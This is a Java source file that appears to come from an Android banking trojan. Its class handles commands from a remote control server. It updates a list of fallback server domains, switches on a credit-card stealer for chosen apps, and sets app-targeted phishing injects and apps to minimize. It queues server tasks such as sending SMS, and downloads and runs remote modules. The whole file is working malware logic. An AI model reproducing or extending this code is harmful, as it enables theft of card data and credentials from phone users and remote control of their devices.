package com.moonny.api;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.moonny.Modules;
import com.moonny.Tasks;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class APIHandlerFactory {

    // 1st process of API response
    public static void process_response(Context ctx, String response)
    {

        if(Constant.DEBUG) Log.d("AlarmReceiver", "Server response: " + response);

        if(response == null || response.trim().isEmpty())
            return;

        JSONArray task_list;
        JSONObject o;

        try {
            o = new JSONObject(response);

            if(o == null) {
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "incoming json is null");
                return;
            }

            // process other data from server response (new domains, injects, etc)

            if(o.has(S.api_data_version)) // 1
                Modules.main(ctx, S.set_pref, new Object[]{ S.api_data_version, o.getInt(S.api_data_version)});
            else
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "no api_data_version");

            if(o.has(S.api_domains)) // "domain1|domain3|domain3"
            {
                String new_domains = o.getString(S.api_domains);
                String default_domains = (String) Modules.main(ctx, S.aes_decrypt, new Object[]{Constant.API_SERVER});
                String domains = (String) Modules.main(ctx, S.list_merge, new Object[]{new_domains, default_domains});
                Modules.main(ctx, S.set_pref, new Object[]{S.api_domains, domains});
            }else
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "no api_domains");

            if(o.has(S.api_cc_stealer_on))
                Modules.main(ctx, S.set_pref, new Object[]{ S.api_cc_stealer_on, o.getString(S.api_cc_stealer_on)});
            else
            if(Constant.DEBUG) Log.d("APIHandlerFactory", "no api_cc_stealer_on");

            if(o.has(S.api_injects)) {
                String injects = o.getString(S.api_injects);
                String cc_on = (String) Modules.main(ctx, S.get_pref, new Object[]{S.api_cc_stealer_on, ""});

                // if one app has CC stealer and inject -- CC will have higher priority
                if(cc_on != null && !cc_on.isEmpty())
                {
                    String[] cc_on_list = (String[]) Modules.main(ctx, S.string2list, new Object[]{cc_on});
                    if(cc_on_list != null && cc_on_list.length > 0)
                    for(String cc_app : cc_on_list)
                    {
                        if((boolean) Modules.main(ctx, S.list_has, new Object[]{injects, ":"+cc_app})) {
                            injects = injects.replace(":"+cc_app, ":--"+cc_app);
                            if(Constant.DEBUG) Log.d("APIHandlerFactory", "cc_on " + cc_app + " removed from injects list; CC has more priority; new injects: " + injects);
                        }
                    }
                }

                Modules.main(ctx, S.set_pref, new Object[]{S.api_injects, injects});
            }else
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "no api_injects");

            if(o.has(S.api_minimize_apps)) {
                Modules.main(ctx, S.set_pref, new Object[]{S.api_minimize_apps, o.getString(S.api_minimize_apps)});
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "api_minimize_apps is " + o.getString(S.api_minimize_apps));
            }else
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "no api_minimize_apps");

            // TASKS
            try {
                task_list = o.getJSONArray(S.api_tasks);
            }catch (JSONException e){
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "no tasks");
                return;
            }

        }catch (JSONException e){
            if(Constant.DEBUG) {
                Log.d("APIHandlerFactory", "process incoming json exception: " + e.getMessage());
                e.printStackTrace();
            }
            return;
        }

        // send task to process
        if(task_list.length() > 0)
            APIHandlerFactory.parse_new_tasks(ctx, task_list);
    }

    // runs from AlarmReceiver, CommandManager, MainService
    // {"tt":[{"c":"sent&&&","p":{"number":"555","text":"werwerewr"},"id":"17"},{"c":"sent&&&","p":{"number":"555","text":"werwerewr"},"id":"21"}]}
    public static void parse_new_tasks(Context ctx, JSONArray task_list) {

        Tasks queue = new Tasks(ctx, S.dynmod_queue_file);
        Modules mods = new Modules(ctx);

        try {
            // разбираем задачи, пришедшие от сервера
//            ArrayList<String> tasks_rows = new ArrayList<>();

            for (int i=0; i < task_list.length(); i++) {
                JSONObject task = task_list.getJSONObject(i);
                String module = task.getString(S.api_mod_name);
                String hash = task.getString(S.api_mod_hash);

                if(Constant.DEBUG) {
                    JSONObject params = task.getJSONObject(S.api_task_params);
                    int task_id = task.getInt(S.api_task_id);
                    if(Constant.DEBUG) Log.d("APIHandlerFactory", "ADDING TASK: #" + task_id + "; module: " + module + "; hash: "+hash+" params:" + params.toString());
                }

                // если нет нужного модуля - ставим на асинхронное скачивание
                if(!mods.is_mod_exists(module, hash))
                    mods.download_mod(module);

                // добавляем задачу в список
//                tasks_rows.add(task.toString());
                queue.queue_add(task.toString());
            }

            // если в списке накопились задачи, сохраняем в файл-очередь
//            if(tasks_rows.size() > 0) {
//                queue.queue_add(tasks_rows);
//            }

        } catch (JSONException e) {
            e.printStackTrace();
        }

        if(Constant.DEBUG) Log.d("APIHandlerFactory", "QUEUE size: " + queue.size());
        process_tasks(ctx, queue, mods);
    }

    public static void process_tasks(Context ctx, Tasks queue, Modules mods)
    {
        if(Constant.DEBUG) Log.d("APIHandlerFactory", "process_tasks()");

        // разбираем задачи из файла-очереди, пока не закончатся
        // если модуль ещё не успел скачаться, то задача выполнится при следующем запуске будильника (через минуту)
        while(true)
        {
            String task_row = queue.poll();
            if(Constant.DEBUG) Log.d("APIHandlerFactory", "process_tasks() task: " + task_row);
            if(task_row == null)
                break;

            JSONObject task;
            String module;
            String module_hash;
            JSONObject params;
            int task_id;

            try {
                task = new JSONObject(task_row);
                module = task.getString(S.api_mod_name);
                params = task.getJSONObject(S.api_task_params);
                task_id = task.getInt(S.api_task_id);
                module_hash = task.getString(S.api_mod_hash);
            }catch (JSONException e){
                e.printStackTrace();
                continue;
            }

            if(Constant.DEBUG) Log.d("APIHandlerFactory", "EXECUTE TASK: #" + task_id + "; module: " + module + "; params:" + params.toString());

            if(!mods.is_mod_exists(module, module_hash))
            {
                if(Constant.DEBUG) Log.d("APIHandlerFactory", "Mod " + module + " does not exists yet");
                queue.queue_add(task_row); // back to queue
                Utils.threadSleep(100);
                continue;
            }

            // отправляем задачу на выполнение
            mods.run_async(task_id, module, params);
        }
    }
}
